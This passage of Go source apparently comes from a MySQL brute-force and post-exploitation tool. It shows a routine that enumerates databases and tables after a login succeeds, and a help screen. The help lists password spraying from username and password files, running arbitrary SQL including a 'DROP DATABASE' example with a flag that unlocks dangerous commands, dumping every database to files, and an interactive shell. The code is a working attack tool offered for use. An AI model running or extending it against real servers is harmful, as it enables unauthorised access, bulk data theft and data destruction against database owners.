    verRows, err := db.QueryContext(ctx, "SELECT VERSION()")
    if err != nil {
        verbosePrintln("Error getting version:", err)
        output.WriteString(fmt.Sprintf("  Error fetching version: %v\n", err))
    } else {
        defer verRows.Close()
        if verRows.Next() {
            var version string
            if err := verRows.Scan(&version); err != nil {
                verbosePrintln("Error scanning version:", err)
                output.WriteString(fmt.Sprintf("  Error scanning version: %v\n", err))
            } else {
                output.WriteString("  " + version + "\n")
            }
        }
    }

    // Get current user
    verbosePrintln("Checking current user")
    output.WriteString("\nCurrent User:\n")
    userRows, err := db.QueryContext(ctx, "SELECT USER(), CURRENT_USER()")
    if err != nil {
        verbosePrintln("Error getting user info:", err)
        output.WriteString(fmt.Sprintf("  Error fetching user info: %v\n", err))
    } else {
        defer userRows.Close()
        if userRows.Next() {
            var sessionUser, currentUser string
            if err := userRows.Scan(&sessionUser, &currentUser); err != nil {
                verbosePrintln("Error scanning user info:", err)
                output.WriteString(fmt.Sprintf("  Error scanning user info: %v\n", err))
            } else {
                output.WriteString("  Session User: " + sessionUser + "\n")
                output.WriteString("  Effective User: " + currentUser + "\n")
            }
        }
    }

    // Enumerate databases
    verbosePrintln("Enumerating databases")
    output.WriteString("\nDatabases:\n")
    dbRows, err := db.QueryContext(ctx, "SHOW DATABASES")
    if err != nil {
        verbosePrintln("Error fetching databases:", err)
        output.WriteString(fmt.Sprintf("  Error fetching databases: %v\n", err))
        queryError = true
    } else {
        defer dbRows.Close()
        dbCount := 0
        for dbRows.Next() {
            var dbName string
            if err := dbRows.Scan(&dbName); err != nil {
                verbosePrintln("Error scanning database:", err)
                output.WriteString(fmt.Sprintf("  Error scanning database: %v\n", err))
            } else {
                dbCount++
                output.WriteString("  " + dbName + "\n")

                // Query tables in this database
                verbosePrintf("Enumerating tables in database: %s\n", dbName)
                tableCtx, tableCancel := context.WithTimeout(ctx, 5*time.Second)
                tableRows, err := db.QueryContext(tableCtx, fmt.Sprintf("SHOW TABLES FROM `%s`", dbName))
                tableCancel()

                if err != nil {
                    verbosePrintln("Error fetching tables:", err)
                    output.WriteString(fmt.Sprintf("    Error fetching tables: %v\n", err))
                } else {
                    defer tableRows.Close()
                    tableCount := 0
                    for tableRows.Next() {
                        var tableName string
                        if err := tableRows.Scan(&tableName); err != nil {
                            verbosePrintln("Error scanning table:", err)
                            output.WriteString(fmt.Sprintf("    Error scanning table: %v\n", err))
                        } else {
                            tableCount++
                            output.WriteString("    " + tableName + "\n")
                        }
                    }
                    verbosePrintf("Found %d tables in database %s\n", tableCount, dbName)
                    if err := tableRows.Err(); err != nil {
                        verbosePrintln("Error iterating tables:", err)
                        output.WriteString(fmt.Sprintf("    Error iterating tables: %v\n", err))
                    }
                }
            }
        }
        verbosePrintf("Found %d databases\n", dbCount)
        if err := dbRows.Err(); err != nil {
            verbosePrintln("Error iterating databases:", err)
            output.WriteString(fmt.Sprintf("  Error iterating databases: %v\n", err))
        }
    }

    // If all queries failed, add a note about insufficient privileges
    if queryError {
        output.WriteString("\nNote: Some enumeration queries failed. This may be due to insufficient privileges.\n")
        output.WriteString("Try running specific queries with the -e flag to get more information.\n")
    }

    verbosePrintln("Database enumeration completed")
    return output.String()
}

// showHelp displays the usage information
func showHelp() {
    displayBanner()

    fmt.Println("Usage: program [options]")
    fmt.Println()
    fmt.Println("Options:")
    fmt.Println("  -h <hostname>       Remote MySQL server address (required)")
    fmt.Println("  -u <username>       Single username to test")
    fmt.Println("  -U <username_file>  File containing usernames, one per line")
    fmt.Println("  --port <port>       MySQL server port (default: 3306)")
    fmt.Println("  -p <password>       Single password to test")
    fmt.Println("  -P <password_file>  File containing passwords, one per line")
    fmt.Println("  -v                  Enable verbose mode")
    fmt.Println("  -f                  Stop at first successful login")
    fmt.Println("  --user-first        Loop over all usernames before next password")
    fmt.Println("  -e <command>        MySQL command to execute on success (default: 'SHOW DATABASES;')")
    fmt.Println("  --allow-dangerous   Allow dangerous commands")
    fmt.Println("  --log-file <file>   Log output to a file")
    fmt.Println("  --config <file>     Load settings from a JSON config file")
    fmt.Println("  --use-ssl           Enable SSL/TLS for MySQL connection")
    fmt.Println("  --skip-ssl          Skip SSL/TLS entirely (overrides --use-ssl)")
    fmt.Println("  --workers <number>  Number of concurrent workers (default: 10)")
    fmt.Println("  --generate-config   Generate a sample config file and exit")
    fmt.Println("  --resume            Resume from the last tested credentials")
    fmt.Println("  -Enum               Enumerate privileges, databases, and tables on success")
    fmt.Println("  --enum-output <file> Save enumeration results to a file")
    fmt.Println("  --connect           Enter interactive mode after successful login (requires -u and -p)")
    fmt.Println("  --dump              Dump all databases and tables to files (requires -u and -p)")
    fmt.Println("  --dump-dir <dir>    Directory to save dumped data (default: mysql_dump)")
    fmt.Println("  --quiet-dump        Only show progress during dump, not actual data")
    fmt.Println("  --max-rows <n>      Maximum rows per dump file (default: 10000, 0 for unlimited)")
    fmt.Println()
    fmt.Println("Examples:")
    fmt.Println("  program -h mysql.server.com -u admin -p pass123 -e 'SHOW TABLES;'")
    fmt.Println("  program -h mysql.server.com -U users.txt -P pass.txt -v --log-file results.log")
    fmt.Println("  program -h mysql.server.com -u admin -p pass123 -e 'DROP DATABASE test;' --allow-dangerous")
    fmt.Println("  program -h mysql.server.com -u admin -p pass123 --connect")
    fmt.Println("  program -h mysql.server.com -u admin -p pass123 --dump --dump-dir ./mysql_data")
    fmt.Println("  program --config config.json")
    fmt.Println("  program --generate-config")
    fmt.Println()
    fmt.Println("Config File Format (JSON):")
    fmt.Println(`{
  "host": "mysql.server.com",
  "port": 3306,
  "singleUser": "admin",
  "userList": "users.txt",
  "singlePass": "pass123",
  "passList": "pass.txt",
  "verbose": true,
  "firstOnly": false,
  "userFirst": false,
  "execCmd": "SHOW DATABASES;",
  "allowDangerous": false,
  "logFile": "results.log",
  "useSSL": false,
  "workers": 10,
  "enum": false,
  "enumOutputFile": "enum_results.txt",
  "dump": false,
  "dumpDir": "mysql_dump",
  "quietDump": false,
  "maxRowsPerFile": 10000
}`)
    fmt.Println()
    fmt.Println("Notes:")
    fmt.Println("  - Command-line flags override config file settings.")
    fmt.Println("  - Dangerous commands are blocked unless --allow-dangerous is set.")
    fmt.Println("  - Dump mode saves all databases, tables, and schemas to the specified directory.")
    fmt.Println("  - System databases like 'information_schema' are skipped during dump.")
    fmt.Println("  - Interactive mode provides a MySQL shell-like experience with pentest helpers.")
}
